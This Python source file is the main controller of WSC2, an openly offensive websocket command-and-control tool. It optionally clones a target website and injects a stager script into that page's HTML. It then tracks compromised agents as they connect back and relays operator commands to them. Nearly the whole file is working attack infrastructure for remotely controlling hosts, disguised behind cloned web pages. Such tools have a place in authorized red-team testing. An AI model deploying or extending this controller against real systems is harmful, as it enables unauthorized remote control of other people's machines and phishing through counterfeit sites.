#!/usr/bin/python
# -*- coding: utf8 -*-
#
# Author: Arno0x0x - https://twitter.com/Arno0x0x
#
# This tool is distributed under the terms of the [GPLv3 licence](http://www.gnu.org/copyleft/gpl.html)

"""

The main controller for the WSC2 agents.

"""
from threading import Thread
import Queue
import os

import config
from lib.websocketserver import WebSocketServerThread
from lib.console import ConsoleThread
from lib import helpers

# make version and author for WSC2
VERSION = "0.1"
AUTHOR = "Arno0x0x - https://twitter.com/Arno0x0x"

#****************************************************************************************
# MAIN thread
#****************************************************************************************
if __name__ == '__main__':

	helpers.printBanner()
	print helpers.color("[*] WSC2 controller - Author: {} - Version {}".format(AUTHOR, VERSION))

	#------------------------------------------------------------------------------
	# Check config parameters
	
	# Build the websocket callback URL
	if config.CALLBACK.startswith('https'):
		wsCallbackURL = 'wss' + config.CALLBACK[5:]
	elif config.CALLBACK.startswith('http'):
		wsCallbackURL = 'ws' + config.CALLBACK[4:]
	else:
		print helpers.color("[!] CALLBACK parameter in the config file should either start with 'http or 'https'")
		quit()

	#------------------------------------------------------------------------------
	# Check that required directories and path are available, if not create them
	if not os.path.isdir(config.INCOMINGFILES):
		os.makedirs(config.INCOMINGFILES)
		print helpers.color("[+] Creating [{}] directory for incoming files".format(config.INCOMINGFILES))
		
	if not os.path.isdir(config.STAGERFILES):
		os.makedirs(config.STAGERFILES)
		print helpers.color("[+] Creating [{}] directory for stagers files".format(config.STAGERFILES))

	if not os.path.isdir(config.STATICFILES):
		os.makedirs(config.STATICFILES)
		print helpers.color("[+] Creating [{}] directory for html files".format(config.STATICFILES))

	#------------------------------------------------------------------------------
	# Generate the index.html that will embed websockets used for communications by the WSC" agent
	indexHtml = None
		
	#---- Should we clone a website ?
	if config.CLONESITE:
		print helpers.color ("[+] Trying to clone website [{}]".format(config.CLONESITE_URL))
		indexHtml = helpers.cloneSite(config.CLONESITE_USERAGENT, config.CLONESITE_URL)
		if indexHtml is None:
			print helpers.color ("[!] Failed to clone website [{}]".format(config.CLONESITE_URL))

	#---- Use a local index.html template if required
	if indexHtml is None:
		print helpers.color ("[+] Using local index.html template")
		try:
			with open('./templates/index.html') as fileHandle:
				indexHtml = fileHandle.read()
				fileHandle.close()
		except IOError:
			print helpers.color("[!] Could not read file [{}]".format('./templates/index.html'))
			quit()
	
	
	wsc2Code = helpers.convertFromTemplate({'wsCallbackURL': wsCallbackURL, 'port': config.PORT, 'prefix': config.IDPREFIX}, './templates/wsc2_html.tpl')
	
	# Inject our wsc2 code into the index.html
	indexHtml = indexHtml.replace("</body>", wsc2Code)

	try:
		with open(config.STATICFILES + '/index.html', 'w+') as fileHandle:
			fileHandle.write(indexHtml)
			fileHandle.close()
			print helpers.color("[+] HTML stager created as [{}]".format(config.STATICFILES + '/index.html'))
	except IOError:
		print helpers.color("[!] Could not create stager file [{}]".format(config.STATICFILES + '/index.html'))
		quit()

	#-----------------------------------------------------------------------------
	# Create a Queue for communication FROM the WebServerSocket thread TO the main thread
	agentQueue = Queue.Queue(0)

	# Create a Queue for communication FROM the Main thread TO the Console thread
	m2cQueue = Queue.Queue(0)

	# Create a Queue for communication FROM the Console thread TO the Main thread
	c2mQueue = Queue.Queue(0)

	# Create an empty dictionnary to hold the list of all agents connecting back
	agentList = dict()

	# Create and start the Console thread
	consoleThread = ConsoleThread(m2cQueue, c2mQueue, agentList)
	consoleThread.daemon = True # Yes, we're rude, and when the main thread exists, so does the console thread
	consoleThread.start()

	# Create and start the WebServerSocket thread
	webSocketServerThread = WebSocketServerThread(agentQueue)
	webSocketServerThread.daemon = True # Yes, we're rude, and when the main thread exists, so does the websocket server thread
	webSocketServerThread.start()

	currentAgentID = None
	currentAgent = None

	#--------------------------------------------------------------
	# Now, loop, treat and dispatch all incoming messages from the different threads
	while True:
		try:
			#-------- Check for message from the websocket server thread
			agentMessage = agentQueue.get_nowait() # Get message from the agentQueue, if ever, not blocking on it

			#---- A new agent has connected back
			if agentMessage['type'] == 'open':
				agentID = agentMessage['ID']
				agentHandler = agentMessage['wsHandler']

				# Adding agent to the agent list
				agentList[agentID] = agentHandler

				print helpers.color("[+] New agent connected: [{}]".format(agentID))

			#---- An agent has closed connection
			elif agentMessage['type'] == 'close':
				agentID = agentMessage['ID']

				# If the disconnect agent was the one currently worked on
				if agentID == currentAgentID:
					m2cQueue.put({'type':'disconnected'})
				del agentList[agentID]
				print helpers.color("[+] Agent disconnected: [{}]".format(agentID))

			#---- An agent has a responded to some previous command
			elif agentMessage['type'] == 'response':
				m2cQueue.put(agentMessage) # Forward the message to the console thread

		# No message from the websocker server thread
		except Queue.Empty:
			pass

		#---------------------------------------------------------------
		try:
			#-------- Check for message from the console thread
			consoleMessage = c2mQueue.get_nowait()

			#---- Console requesting to exit program
			if consoleMessage['type'] == 'exit':
				print helpers.color("[!] Exiting...")
				quit()

			#---- Console requesting to work on another agent
			elif consoleMessage['type'] == 'switchAgent':
				agentID = consoleMessage['ID']

				# Is the agent still available in the list ?
				if agentID in agentList:
					currentAgentID = agentID
					currentAgent = agentList[agentID]
					m2cQueue.put({'type': 'switchAgent', 'value': 'OK'})
				else:
					m2cQueue.put({'type': 'switchAgent', 'value': 'NOK'})

			#---- Console requesting to send a request to the current agent
			elif consoleMessage['type'] == 'request':
				request = consoleMessage['value']
				currentAgent.write_message(request)

		# No message from the console thread
		except Queue.Empty:
			pass
